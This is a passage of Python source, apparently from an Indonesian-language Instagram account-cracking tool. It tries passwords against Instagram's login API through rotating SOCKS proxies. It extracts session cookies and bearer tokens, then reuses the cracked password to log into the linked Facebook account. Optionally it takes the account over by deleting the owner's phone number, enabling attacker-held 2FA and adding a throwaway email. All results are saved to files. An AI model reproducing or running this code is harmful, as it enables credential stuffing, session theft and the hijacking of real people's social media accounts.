                    proxy = {'http': 'socks4://'+str(random.choice(open("Penyimpanan/ProxyTS.txt","r").read().splitlines()))}
                except (Exception) as e: Console().print(f"[grey50]   ──>[red] {str(e).title()}", end='\r'); proxy = {'http': 'socks4://184.178.172.26:4145'}
                response = byps.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/', data = encode, proxies = proxy, allow_redirects=True).text
                self.save_result = self.Simpan_Result()
                if 'logged_in_user' in str(response.replace('\\','')):
                    self.success+=1
                    try: ig_set_autorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.replace('\\', ''))).group(1); decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_autorization.split('Bearer IGT:2:')[1]))
                    except (Exception) as e: print(e)
                    try:
                        cookie = (';'.join(['%s=%s'%(name, value) for name, value in decode_ig_set_authorization.items()]))
                    except (Exception) as e: cookie = ('Cookies tidak di temukan')
                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    try: facebook_acc = Requ().Facebook_Acc(cookie)
                    except (UnboundLocalError) as e: pass
                    try:
                        users = facebook_acc.split('|')[0]
                        fulls = facebook_acc.split('|')[1]
                        response_facebook = AccesFacebook().Username_And_Password(users,passwd)
                    except (Exception, UnboundLocalError) as e: response_facebook = ('Response Error 404')
                    if 'ya' in self.amankan_akun:
                        try:
                            num = Require().DeltPhone(cookie)
                            statp, pone = num['Dihapus'], num['Number']
                            deleted = f'{pone} berhasil di hapus' if statp is True else f'{pone} gagal di hapus '
                            two = Require().Aktifkan2F(cookie)
                            kode, key, statf = two['kode-pemulihan'], two['SecretKey'], two['success-a2f']
                            stat2fa = 'A2F berhasil di aktifkan' if statf is not False else 'A2F gagal di aktifkan'
                            Temp = Require().AddMail(cookie)
                            email, state, inbx = Temp['email'], Temp['di-konfirmasi'], Temp['Url']
                            statd = 'berhasil di konfirmasi' if state is True else 'gagal di konfirmasi'
                            tree = Tree('\r                                             ')
                            tree = tree.add('╭ [italic green]Response Success')
                            tree.add(f'[italic white]Username [green]{username}')
                            tree.add(f'[italic white]Fullname [green]{fullname}')
                            tree.add(f'[italic white]Password [green]{passwd}')
                            tree.add(f'[italic white]Profiles [green]{follower}[grey50]/[green]{followed}[grey50]/[green]{feedpost}')
                            trup = tree.add('[italic green]Response Facebook')
                            trup.add(f'[italic white]Username [green]{users}')
                            trup.add(f'[italic white]Fullname [green]{fulls}')
                            trup.add(f'[italic white]Password [green]{passwd}')
                            trup.add(f'[italic white]Response [green]{response_facebook}')
                            truu= tree.add('[italic green]Response 2FA')
                            truu.add(f'[italic white]Response [green]{email} {statd}')
                            truu.add(f'[italic white]Response [green]{inbx}')
                            truu.add(f'[italic white]Response [green]{deleted}')
                            truu.add(f'[italic white]Response [green]{stat2fa}')
                            truu.add(f'[italic white]Response [green]{key}')
                            truu.add(f'[italic white]Response [green]{kode}')
                            trua = tree.add('[italic green]Response Cookie')
                            trua.add(f'[italic white]Cookie [green]{cookie}')
                            trua.add(f'[italic white]Bearer [green]{ig_set_autorization}')
                            tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{stat2fa}|{key}|{kode}|{deleted}|{email} {statd}|{inbx}|{cookie}|{users}|{fulls}|{response_facebook}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree('\r                                             ')
                            tree = tree.add('╭ [italic green]Response Success')
                            tree.add(f'[italic white]Username [green]{username}')
                            tree.add(f'[italic white]Fullname [green]{fullname}')
                            tree.add(f'[italic white]Password [green]{passwd}')
                            tree.add(f'[italic white]Profiles [green]{follower}[grey50]/[green]{followed}[grey50]/[green]{feedpost}')
                            trup = tree.add('[italic green]Response Facebook')
                            trup.add(f'[italic white]Username [green]{users}')
                            trup.add(f'[italic white]Fullname [green]{fulls}')
                            trup.add(f'[italic white]Password [green]{passwd}')
                            trup.add(f'[italic white]Response [green]{response_facebook}')
                            trua = tree.add('[italic green]Response Cookie')
                            trua.add(f'[italic white]Cookie [green]{cookie}')
                            trua.add(f'[italic white]Bearer [green]{ig_set_autorization}')
                            tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                            printz(tree)
                            save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}|{users}|{fulls}|{response_facebook}\n'
                    else:
                        tree = Tree('\r                                             ')
                        tree = tree.add('╭ [italic green]Response Success')
                        tree.add(f'[italic white]Username [green]{username}')
                        tree.add(f'[italic white]Fullname [green]{fullname}')
                        tree.add(f'[italic white]Password [green]{passwd}')
                        tree.add(f'[italic white]Profiles [green]{follower}[grey50]/[green]{followed}[grey50]/[green]{feedpost}')
                        trup = tree.add('[italic green]Response Facebook')
                        trup.add(f'[italic white]Username [green]{users}')
                        trup.add(f'[italic white]Fullname [green]{fulls}')
                        trup.add(f'[italic white]Password [green]{passwd}')
                        trup.add(f'[italic white]Response [green]{response_facebook}')
                        trua = tree.add('[italic green]Response Cookie')
                        trua.add(f'[italic white]Cookie [green]{cookie}')
                        trua.add(f'[italic white]Bearer [green]{ig_set_autorization}')
                        tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                        printz(tree)
                        save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}|{users}|{fulls}|{response_facebook}\n'
                    with open('OK/OK-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break          
                elif 'two_factor_required' in str(response.replace('\\','')):
                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r                                             ')
                    tree = tree.add('╭ [italic red]Response A2F')
                    tree.add(f'[italic white]Username : [red]{username}')
                    tree.add(f'[italic white]Fullname : [red]{fullname}')
                    tree.add(f'[italic white]Password : [red]{passwd}')
                    tree.add(f'[italic white]Profiles : [red]{follower}[grey50]/[red]{followed}[grey50]/[red]{feedpost}')
                    tree.add(f'[italic white]Useragent : [red]{byps.headers["user-agent"]}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.faktor+=1
                    with open('2F/2F-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                elif 'challenge_required' in str(response.replace('\\','')):
                    try: fullname, follower, followed, feedpost, biography, is_private, is_verified, profile_pic_url, profile_pic_url_hd, bussiness = Requ().Validasi_Username(username)
                    except (UnboundLocalError) as e: pass
                    tree = Tree('\r                                             ')
                    tree = tree.add('╭ [italic yellow]Response Checkpoint')
                    tree.add(f'[italic white]Username : [yellow]{username}')
                    tree.add(f'[italic white]Fullname : [yellow]{fullname}')
                    tree.add(f'[italic white]Password : [yellow]{passwd}')
                    tree.add(f'[italic white]Profiles : [yellow]{follower}[grey50]/[yellow]{followed}[grey50]/[yellow]{feedpost}')
                    tree.add(f'[italic white]Useragent : [yellow]{byps.headers["user-agent"]}')
                    printz(tree)
                    save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                    self.chekpoint+=1
                    with open('CP/CP-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
                elif 'ip_block' in str(response.replace('\\','')):
                    Console().print(f"[grey50]   ──>[red] Hidupkan Mode Pesawat 5 Detik!!", end='\r')
                    time.sleep(3.5)  
                else: continue   
            except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects): Console().print(f"[grey50]   ──>[red] Koneksi Anda Bermasalah!", end='\r'); time.sleep(31)               
        self.looping+=1
        
class AccesFacebook:
    def __init__(self) -> None:
        pass
        
    def Username_And_Password(self, username, password):
        byps = requests.Session()
        ua_generate = Useragent().useragent_facebook()
        try:
            byps.headers.update({
                'accept-language': 'en-US,id-ID,id;q=0.9',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-ch-ua-mobile': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'cache-control': 'max-age=0',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'sec-ch-ua': '"Not)A;Brand";v="{}", "Windows Edge";v="{}", "Cromium";v="{}"'.format(str(random.randint(8,24)), re.search(r'Chrome/(\d+)', str(ua_generate)).group(1), re.search(r'Chrome/(\d+)', str(ua_generate)).group(1)),
                'user-agent': ua_generate
            })
            response = byps.get('https://web.facebook.com/login/?').text
            payload = {
	    		'jazoest':re.search('name="jazoest" value="(.*?)"',str(response)).group(1),
				'lsd':re.search('name="lsd" value="(.*?)"',str(response)).group(1),
                'timezone': '-420',
                'lgndim': '',
				'login': '1',
                'persistent': '1',
                'default_persistent': '',
                'login':'Masuk'
	    	}
            byps.headers.update({
                'host': 'web.facebook.com',
                'origin': 'https://web.facebook.com/',
                'referer': 'https://web.facebook.com/login/?',
                'cache-control': 'max-age=0',
                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="{}.0.0.0", "Windows Edge";v="{}", "Cromium";v="{}"'.format(str(random.randint(8,24)), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua_generate)).group(1), re.search(r'Chrome/(\d+\.\d+\.\d+\.\d+)', str(ua_generate)).group(1)),
                'accept-encoding': 'gzip, deflate',
                'content-type': 'application/x-www-form-urlencoded',
                'content-length': str(len(("&").join([ "%s=%s" % (name, value) for name, value in payload.items() ]))),
                'cookie': '_js_datr={}; wd=1280x601; dpr=1.5'.format(re.search('"_js_datr","(.*?)"', str(response)).group(1)),
                'view-width': str(random.randint(1311,1499))
            })
            payload.update({'email': username, 'encpass': '#PWD_BROWSER:0:{}:{}'.format(str(time.time())[:10],password)})
            response2 = byps.post('https://web.facebook.com/login/?email='+str(username)+'&locale=jv_ID&_rdr', data = payload, allow_redirects = True)
            if 'c_user' in byps.cookies.get_dict().keys():
                cookies = (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                return(cookies)      
            elif 'checkpoint' in byps.cookies.get_dict().keys():
                return('[yellow]Chekpoint detected') 
            else: return('[red]Password salah')
        except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects) as e: pass
        
            
          
            
            